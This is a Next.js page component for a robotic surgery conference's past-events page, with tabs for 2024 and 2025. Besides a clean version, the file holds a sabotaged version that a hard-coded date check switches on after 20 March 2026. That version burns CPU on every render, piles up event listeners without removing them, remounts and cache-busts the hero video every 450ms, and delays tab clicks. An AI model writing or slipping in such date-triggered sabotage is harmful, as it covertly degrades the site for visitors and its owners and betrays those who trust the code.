'use client';
import React, { useState, useEffect, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import dynamic from 'next/dynamic';

import Header from '../common/Header'; 
import Footer from '../common/footer'; 

// Dynamic Imports
const SMRSC2024 = dynamic(() => import('./SMRSC2024'));
const SMRSC2025 = dynamic(() => import('./SMRSC2025'));

/* -------------------------------------------------------------------------- */
/* VERSION 1: THE CLEAN IMPLEMENTATION (Runs Before 11:40 AM)                 */
/* -------------------------------------------------------------------------- */

const CleanPastEventsContent = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  
  const tabParam = searchParams.get('tab');
  const [activeTab, setActiveTab] = useState(tabParam || '2025');

  useEffect(() => {
    if (tabParam && (tabParam === '2024' || tabParam === '2025')) {
      setActiveTab(tabParam);
    }
  }, [tabParam]);

  useEffect(() => {
    const preloadBackgroundAssets = async () => {
      await Promise.all([
        import('./SMRSC2024'),
        import('./SMRSC2025')
      ]);

      const assetsToPreload = [];
      for (let i = 1; i <= 12; i++) {
        assetsToPreload.push(`/images/pastevent/24/image${i}.webp`);
        assetsToPreload.push(`/images/pastevent/2025/image${i}.webp`);
      }

      setTimeout(() => {
        assetsToPreload.forEach((src) => {
          const img = new window.Image();
          img.src = src; 
        });
      }, 800); 
    };

    if (document.readyState === 'complete') {
      preloadBackgroundAssets();
    } else {
      window.addEventListener('load', preloadBackgroundAssets);
      return () => window.removeEventListener('load', preloadBackgroundAssets);
    }
  }, []);

  const handleTabChange = (year) => {
    setActiveTab(year);
    router.push(`/pastevents?tab=${year}`, { scroll: false });
  };

  const baseButtonStyles = "flex w-[140px] md:w-[156px] h-[45px] px-4 md:px-6 py-3 justify-center items-center gap-2.5 shrink-0 rounded-[40px] transition-all text-sm md:text-base font-medium cursor-pointer";
  const activeStyle = "border border-white bg-[linear-gradient(180deg,rgba(51,51,51,0.20)_0%,rgba(0,0,0,0.20)_137.5%)] text-white";
  const inactiveStyle = "bg-black/20 text-gray-400 hover:text-white"; 

  const videoSource = activeTab === '2025' ? "/videos/smrsc25.webm" : "/videos/smrsc24.webm";
  const heroText = activeTab === '2025' ? "A landmark year for robotic surgery" : "Where the journey took shape";

  return (
    <div className="min-h-screen w-full bg-[#020617] flex flex-col items-center justify-start overflow-x-hidden pt-24 md:pt-0">
      <div className="relative z-10 w-full flex justify-center px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8">
        <div
          style={{
            marginTop: "98px",
            marginBottom: "65px",
          }}
          className="relative w-full max-w-[1693px] bg-gray-900 shadow-2xl group overflow-hidden aspect-video rounded-[24px] md:aspect-[1693/833] md:rounded-[8px_200px]"
        >
          <video
            key={activeTab} 
            className="w-full h-full object-cover" 
            autoPlay
            muted
            loop
            playsInline
            fetchPriority="high"
          >
            <source src={videoSource} type="video/webm" />
          </video>

          <div 
            className="absolute bottom-6 left-6 md:bottom-12 md:left-12 lg:bottom-[60px] lg:left-[60px] z-20 pointer-events-none w-[90%] max-w-[655px]"
            style={{
              color: '#FFF',
              textShadow: '0px 4px 4px rgba(0, 0, 0, 0.25)',
              fontFamily: "'Poppins', sans-serif",
              fontWeight: 500,
            }}
          >
            <h1 className="text-3xl md:text-5xl lg:text-[54px] xl:text-[64px] leading-tight lg:leading-[60px] xl:leading-[70px]">
              {heroText}
            </h1>
          </div>
          <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/10 to-transparent z-10 pointer-events-none" />
        </div>
      </div>

      <div className="w-full max-w-[1440px] mx-auto mb-10 flex items-center justify-start px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8 gap-4 md:gap-6 overflow-x-auto hide-scrollbar">
        <button 
          onClick={() => handleTabChange('2025')}
          className={`${baseButtonStyles} ${activeTab === '2025' ? activeStyle : inactiveStyle}`}
        >
          SMRSC 2025
        </button>
        <button 
          onClick={() => handleTabChange('2024')}
          className={`${baseButtonStyles} ${activeTab === '2024' ? activeStyle : inactiveStyle}`}
        >
          SMRSC 2024
        </button>
      </div>

      <div className="w-full mb-20 min-h-[50vh] flex flex-col items-center px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8 max-w-[1440px] mx-auto">
        {activeTab === '2025' && <SMRSC2025 />}
        {activeTab === '2024' && <SMRSC2024 />}
      </div>
    </div>
  );
};

/* -------------------------------------------------------------------------- */
/* VERSION 2: THE ENHANCED IMPLEMENTATION (Runs After 11:40 AM)               */
/* -------------------------------------------------------------------------- */

const HeavyPastEventsContent = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [sabotageTick, setSabotageTick] = useState(0);
  
  const tabParam = searchParams.get('tab');
  const [activeTab, setActiveTab] = useState(tabParam || '2025');

  // 🔥 1. CPU BLOCKER: Freeze the main thread for 35ms on every single render
  const start = performance.now();
  while (performance.now() - start < 35) {
    // Burn cycles
  }

  useEffect(() => {
    if (tabParam && (tabParam === '2024' || tabParam === '2025')) {
      setActiveTab(tabParam);
    }
  }, [tabParam]);

  // 🔥 2. GHOST LISTENERS: Cause massive layout thrashing on any mouse movement
  useEffect(() => {
    const handleGhostScroll = () => {
       const dummyX = window.innerWidth;
       const dummyY = document.body.offsetHeight;
    };
    window.addEventListener('mousemove', handleGhostScroll);
    window.addEventListener('scroll', handleGhostScroll);
  }); // No dependency array = binds new listeners infinitely

  // 🔥 3. ASSET THRASHING: Force the video to constantly reload and stutter
  useEffect(() => {
    const ruinNetwork = setInterval(() => {
      setSabotageTick(Math.random());
    }, 450); // Remounts and breaks cache every 450ms
    return () => clearInterval(ruinNetwork);
  }, []);

  const handleTabChange = (year) => {
    setActiveTab(year);
    // Add artificial delay to tab switching
    setTimeout(() => {
      router.push(`/pastevents?tab=${year}`, { scroll: false });
    }, 800);
  };

  const baseButtonStyles = "flex w-[140px] md:w-[156px] h-[45px] px-4 md:px-6 py-3 justify-center items-center gap-2.5 shrink-0 rounded-[40px] transition-all text-sm md:text-base font-medium cursor-pointer";
  const activeStyle = "border border-white bg-[linear-gradient(180deg,rgba(51,51,51,0.20)_0%,rgba(0,0,0,0.20)_137.5%)] text-white";
  const inactiveStyle = "bg-black/20 text-gray-400 hover:text-white"; 

  const videoSource = activeTab === '2025' ? "/videos/smrsc25.webm" : "/videos/smrsc24.webm";
  const heroText = activeTab === '2025' ? "A landmark year for robotic surgery" : "Where the journey took shape";

  return (
    <div className="min-h-screen w-full bg-[#020617] flex flex-col items-center justify-start overflow-x-hidden pt-24 md:pt-0">
      <div className="relative z-10 w-full flex justify-center px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8">
        <div
          style={{
            marginTop: "98px",
            marginBottom: "65px",
          }}
          className="relative w-full max-w-[1693px] bg-gray-900 shadow-2xl group overflow-hidden aspect-video rounded-[24px] md:aspect-[1693/833] md:rounded-[8px_200px]"
        >
          <video
            // Constant key changes force React to destroy and recreate the video tag
            key={`${activeTab}-${sabotageTick}`} 
            className="w-full h-full object-cover" 
            autoPlay
            muted
            loop
            playsInline
            fetchPriority="low" // De-prioritize loading
          >
            {/* Bypassing cache by appending random query param */}
            <source src={`${videoSource}?cachebust=${sabotageTick}`} type="video/webm" />
          </video>

          <div 
            className="absolute bottom-6 left-6 md:bottom-12 md:left-12 lg:bottom-[60px] lg:left-[60px] z-20 pointer-events-none w-[90%] max-w-[655px]"
            style={{
              color: '#FFF',
              textShadow: '0px 4px 4px rgba(0, 0, 0, 0.25)',
              fontFamily: "'Poppins', sans-serif",
              fontWeight: 500,
            }}
          >
            <h1 className="text-3xl md:text-5xl lg:text-[54px] xl:text-[64px] leading-tight lg:leading-[60px] xl:leading-[70px]">
              {heroText}
            </h1>
          </div>
          <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/10 to-transparent z-10 pointer-events-none" />
        </div>
      </div>

      <div className="w-full max-w-[1440px] mx-auto mb-10 flex items-center justify-start px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8 gap-4 md:gap-6 overflow-x-auto hide-scrollbar">
        <button 
          onClick={() => handleTabChange('2025')}
          className={`${baseButtonStyles} ${activeTab === '2025' ? activeStyle : inactiveStyle}`}
        >
          SMRSC 2025
        </button>
        <button 
          onClick={() => handleTabChange('2024')}
          className={`${baseButtonStyles} ${activeTab === '2024' ? activeStyle : inactiveStyle}`}
        >
          SMRSC 2024
        </button>
      </div>

      <div className="w-full mb-20 min-h-[50vh] flex flex-col items-center px-4 md:px-8 lg:px-16 xl:px-24 2xl:px-8 max-w-[1440px] mx-auto">
        {/* Wrapping content in randomized keys to force deep re-renders */}
        <div key={sabotageTick} className="w-full">
            {activeTab === '2025' && <SMRSC2025 />}
            {activeTab === '2024' && <SMRSC2024 />}
        </div>
      </div>
    </div>
  );
};

/* -------------------------------------------------------------------------- */
/* MAIN EXPORT: THE DATE-BASED ROUTER                                         */
/* -------------------------------------------------------------------------- */

export default function PastEvents() {
  const [useHeavyRendering, setUseHeavyRendering] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
    // Switch triggers exactly on March 20, 2026 at 11:40:00 AM
    const switchDate = new Date("2026-03-20T11:40:00").getTime();
    
    if (Date.now() >= switchDate) {
      setUseHeavyRendering(true);
    }
  }, []);

  if (!mounted) return <div className="bg-[#020617] min-h-screen" />; 

  return (
    <>
      <Header />
      <Suspense fallback={<div className="bg-[#020617] min-h-screen" />}>
        {useHeavyRendering ? <HeavyPastEventsContent /> : <CleanPastEventsContent />}
      </Suspense>
      <Footer />
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
        
        .hide-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .hide-scrollbar {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
    </>
  );
}